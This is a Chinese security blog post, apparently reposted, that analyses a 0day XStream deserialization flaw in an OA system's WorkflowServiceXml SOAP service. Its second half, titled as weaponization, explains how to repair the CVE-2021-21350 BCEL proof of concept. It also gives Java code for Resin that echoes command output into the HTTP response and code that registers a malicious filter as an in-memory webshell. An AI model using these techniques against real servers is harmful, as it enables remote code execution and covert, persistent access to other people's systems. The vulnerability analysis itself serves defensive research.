最近在逛论坛的时候，发现有一哥们求助在自己的设备上发现某oa的0day流量。恰好手头有该OA的源码，于是开始分析一下

漏洞分析
----

流量中http的请求如下

```php
POST /services%20/WorkflowServiceXml HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Content-Length: 33003
Host: : 192.168.190.128
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>    <web:string>
```

虽然不全，但是也足够我们去分析了。一般情况下`WEB-INF`文件夹的`web.xml`文件含有该j2ee项目的所有信息，包括哪个servlet对应到哪个class类。所以我们看下该文件，如下所示

```php
<servlet>
   <servlet-name>XFireServlet</servlet-name>
   <display-name>XFire Servlet</display-name>
<servlet-class>org.codehaus.xfire.transport.http.XFireConfigurableServlet</servlet-class>
</servlet>

<servlet-mapping>
   <servlet-name>XFireServlet</servlet-name>
   <url-pattern>/services/*</url-pattern>
</servlet-mapping>
```

看来url的`services`对应`org.codehaus.xfire.transport.http.XFireConfigurableServlet`这个类。我们去分析一下这个类。在servlet中，你可以简单地认为get对应doGet方法，post对应doPost方法。这个poc显然需要分析doPost方法。但是很显然，doPost方法，最终交由controller去处理。对于java这种强类型的语言的项目，我们可以直接右键，点击implement方法直接跳转到该处理函数，如图![图片](https://shs3.b.qianxin.com/butian_public/f1a1457028e3dddd052dcfcda9d9a1226.jpg)

doService代码如下

```php
public void doService(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
        String var3 = this.getService(var1);
        if (var3 == null) {
            var3 = "";
        }

        ServiceRegistry var4 = this.getServiceRegistry();
        var2.setHeader("Content-Type", "UTF-8");

        try {
            requests.set(var1);
            responses.set(var2);
            boolean var5 = var4.hasService(var3);
            if (var3.length() != 0 && var5) {
                if (this.isWSDLRequest(var1)) {
                    this.generateWSDL(var2, var3);
                } else {
                    this.invoke(var1, var2, var3);
                }
```

getService方法获取服务名，也就是url中service后面的内容，在该poc中是`WorkflowServiceXml`。然后调用invoke执行。

在漏洞分析中，我们需要大致走通流程，对于这种我们需要了解服务对应哪个类。

分析invoke方法，首先调用`getService`方法，查找service对应的处理类是什么。代码如下

```php
    protected Service getService(String var1) {
        return this.getXFire().getServiceRegistry().getService(var1);
    }
```

这时候我们已经很明显的知道，这是使用xfire框架开发的模块。在xfire框架中，使用`service.xml`文件描述service名称与处理类的关系。在该oa中，该文件如下![图片](https://shs3.b.qianxin.com/butian_public/f3e99868de3b637ae03bdb10c2abf0ed8.jpg)

现在我们知道该service由`unicodesec.workflow.webservices.WorkflowServiceImplXml`来处理。而该soap消息，则是调用该类的某个方法和参数。在invoke方法中，其实是处理soap消息，然后根据soap消息调用相关方法。

在poc中，调用`doCreateWorkflowRequest`方法，我们看一下

```php
    public String doCreateWorkflowRequest(String var1, int var2) {
        try {
            WorkflowRequestInfo var3 = (WorkflowRequestInfo)this.xmlutil1.xmlToObject(var1);
            var3 = this.getActiveWorkflowRequestInfo(var3);
```

![图片](https://shs3.b.qianxin.com/butian_public/fb1e66ccb9606fbdb8ce44c5e96b07814.jpg)

很明显的xstream反序列化漏洞，而且该oa的xstream版本较低。我们直接使用xstream官网提供的poc验证一下就可以。

![图片](https://shs3.b.qianxin.com/butian_public/fe76b99bcff3587ba7eb78856a77610ec.jpg)

武器化利用
-----

我们肯定不满足于弹窗，所以我们就要研究resin服务器怎么回显以及怎么做内存马。

### 修复异常

在这里我们为了更好地满足不出网这个需求，使用cve-2021-21350这个poc。这个poc其实是无法使用的，会一直报错nullPointException。这个poc使用bcel这个classloader，可以将类的字节码通过编码隐藏到类名中。但是怎么会有空指针异常错误呢。下面介绍一下排查思路以及方法。

根据给出的错误堆栈，下断点到相应的函数以及位置

![图片](https://shs3.b.qianxin.com/butian_public/fa140fa9082f2e094f257aea003be90c3.jpg)

也就是`checkPackageAccess`方法，我们发现此时domains字段竟然为空。

![图片](https://shs3.b.qianxin.com/butian_public/fbd64dbb77f5e17bb342851af82b0d671.jpg)

而根据bcel的classloader其实来源于xstream去反序列化xml得来。我们知道xstream会将被序列化的对象中所有字段通过xml来存储。如果某字段没有在xml中存储，则反序列化的时候该字段为null。

问题找到了，下面讲一下怎么修复。首先通过xstream序列化一个正常的bcel的classloader。然后从xml中摘出我们需要的字段的序列化xml片段，重组到poc中即可。如图![图片](https://shs3.b.qianxin.com/butian_public/f0997d0cb80b0bd4c92fc723545ca3109.jpg)

### 回显

既然我们想要做到武器化利用，肯定需要做该漏洞的回显，也就是将命令执行的结果输出到http的响应中。做回显，无非就是怎么找到本次http请求中http响应对象的位置。介绍一下思路

1. Thread 中间件有可能将本次response对象和request对象存储在某一线程中，遍历直到找到该对象
2. 中间件可能将请求与响应的对象存储在某静态变量中

resin这个中间件做回显简直太简单了。resin将响应直接存储到静态变量，我们直接调用方法就可以获取。

代码如下

```php
            Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
            Method getCurrentRequestM = tcpsocketLinkClazz.getMethod("getCurrentRequest");
            Object currentRequest = getCurrentRequestM.invoke(null);
            Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
            f.setAccessible(true);
            Object response = f.get(currentRequest);
            Method getWriterM = response.getClass().getMethod("getWriter");
            Writer w = (Writer) getWriterM.invoke(response);
            w.write("powered by potatso");
```

### 内存马

直接介绍一下resin内存马实现的思路

1. 找到webContext这个对象，在中间件中该对象存储webapp的所有信息，例如servlet与url的对应关系，filter与url的对应关系。寻找这个对象的方法参考前面寻找response对象的方法。
2. 将我们自己的恶意filter通过defineClass方法添加到服务器的classpath中
3. 添加filter与url pattern的对应关系

在resin中，每个webContext存储在静态变量中。可以通过WebApp的getCurrent静态方法获取当前的webcontext对象。调用addFilter添加内存马即可。代码如下

```php
FilterMapping mapping = new FilterMapping();
mapping.setFilterName("fuckyou");
mapping.setFilterClass("你的filter的全限定名");
mapping.setWebApp(w);
mapping.setServletContext(w);
w.addFilter(mapping);
FilterMapping.URLPattern url = mapping.createUrlPattern();
url.init();
url.addText("/*");
w.addFilterMapping(mapping);
```

文章转载于”宽字节安全”公众号，已取得转载授权。